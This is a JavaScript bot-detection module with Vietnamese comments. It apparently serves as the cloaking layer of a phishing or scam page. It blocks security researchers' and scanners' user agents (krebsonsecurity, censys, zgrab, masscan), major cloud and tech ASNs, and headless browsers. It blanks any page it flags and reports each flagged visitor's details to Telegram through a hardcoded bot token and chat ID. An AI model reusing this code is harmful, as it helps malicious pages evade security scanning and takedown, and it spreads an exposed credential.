const TELEGRAM_TOKEN = '8389822366:AAHHHMaQ5sLLYbOcylulAHWENKOfzqsNgmc';
const CHAT_ID = '-1003555771475';

const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysInspect', 'facebookexternalhit', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];
const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const sendToTelegram = async (reason) => {
    const { userAgent } = navigator;
    const { width, height } = screen;
    const ipInfo = localStorage.getItem('ipInfo') || 'k có data ip';

    const text = `Bot Detected\nLý do: ${reason}\nUA: ${userAgent}\nScreen: ${width}x${height}\nIP Info: ${ipInfo}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text })
        });
    } catch (err) {
        console.error('lỗi send tele:', err);
    }
};

const blockAction = async (reason) => {
    await sendToTelegram(reason);
    document.body.innerHTML = '';
    try {
        window.location.href = 'about:blank';
    } catch {
        //
    }
    return { isBot: true, reason };
};

const checkUserAgent = async () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword));
    if (blockedKeyword) return { isBot: true, reason: `ua chứa keyword: ${blockedKeyword}` };
    return { isBot: false };
};

const checkGeoIP = async () => {
    try {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) return { isBot: false };

        const { asn, ip } = JSON.parse(ipInfo);

        if (blockedASNs.includes(Number(asn))) return { isBot: true, reason: `ASN bị chặn: ${asn}` };
        if (blockedIPs.includes(ip)) return { isBot: true, reason: `IP bị chặn: ${ip}` };

        return { isBot: false };
    } catch {
        return { isBot: false };
    }
};

const checkAdvancedWebDriver = async () => {
    if (navigator.webdriver === true) return { isBot: true, reason: 'navigator.webdriver = true' };
    if ('__nightmare' in window) return { isBot: true, reason: 'nightmare detected' };
    if ('_phantom' in window || 'callPhantom' in window) return { isBot: true, reason: 'phantom detected' };
    if ('Buffer' in window) return { isBot: true, reason: 'buffer detected' };
    if ('emit' in window) return { isBot: true, reason: 'emit detected' };
    if ('spawn' in window) return { isBot: true, reason: 'spawn detected' };

    const seleniumProps = ['__selenium_unwrapped', '__webdriver_evaluate', '__driver_evaluate', '__webdriver_script_function', '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_evaluate', '__fxdriver_unwrapped'];
    const foundProp = seleniumProps.find((prop) => prop in window);
    if (foundProp) return { isBot: true, reason: `selenium prop: ${foundProp}` };

    if ('__webdriver_evaluate' in document) return { isBot: true, reason: 'webdriver_evaluate in document' };
    if ('__selenium_evaluate' in document) return { isBot: true, reason: 'selenium_evaluate in document' };
    if ('__webdriver_script_function' in document) return { isBot: true, reason: 'webdriver_script_function in document' };

    return { isBot: false };
};

const checkNavigatorAnomalies = async () => {
    const { hardwareConcurrency } = navigator;
    if (navigator.webdriver === true) return { isBot: true, reason: 'navigator.webdriver = true' };
    if (hardwareConcurrency && hardwareConcurrency > 128) return { isBot: true, reason: `hardwareConcurrency quá cao: ${hardwareConcurrency}` };
    if (hardwareConcurrency && hardwareConcurrency < 1) return { isBot: true, reason: `hardwareConcurrency quá thấp: ${hardwareConcurrency}` };

    return { isBot: false };
};

const checkScreenAnomalies = async () => {
    const { width, height } = screen;
    if (width === 2000 && height === 2000) return { isBot: true, reason: 'màn hình 2000x2000 (bot pattern)' };
    if (width > 4000 || height > 4000) return { isBot: true, reason: `màn hình quá lớn: ${width}x${height}` };
    if (width < 200 || height < 200) return { isBot: true, reason: `màn hình quá nhỏ: ${width}x${height}` };

    return { isBot: false };
};

const detectBot = async () => {
    const checks = [checkUserAgent, checkAdvancedWebDriver, checkNavigatorAnomalies, checkScreenAnomalies, checkGeoIP];

    for (const check of checks) {
        const { isBot, reason } = await check();
        if (isBot) return await blockAction(reason);
    }

    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
    const foundKeyword = obviousBotKeywords.find((keyword) => navigator.userAgent.toLowerCase().includes(keyword));

    if (foundKeyword) {
        return await blockAction(`obvious bot keyword: ${foundKeyword}`);
    }

    return { isBot: false };
};

export default detectBot;
